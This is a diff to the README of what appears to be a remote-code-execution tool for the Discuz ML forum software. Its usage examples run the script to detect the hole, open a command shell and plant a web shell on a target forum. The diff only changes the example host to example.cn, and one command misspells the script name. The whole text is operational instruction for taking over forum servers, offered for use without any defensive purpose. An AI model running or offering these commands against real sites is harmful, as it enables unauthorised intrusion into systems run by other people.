@@ -37,18 +37,18 @@ pip -r requirements.txt
 ----------------
 **Vulnerability Detection** 
 
-`python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" `<br/>
+`python discuz_mlRce.py -u "http://www.example.cn/forum.php" `<br/>
 
 ------
 **GETTING Command Shell**
 
-`python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" --cmdshell`
+`python discuz_mlRce.py -u "http://www.example.cn/forum.php" --cmdshell`
 
 ----------------
 
 **GETTING Shell URL**
 
-`python ddiscuz_mlRce.py -u "http://www.ppp.cn/forum.php" --getshell`
+`python ddiscuz_mlRce.py -u "http://www.example.cn/forum.php" --getshell`
 
 ----------------
 
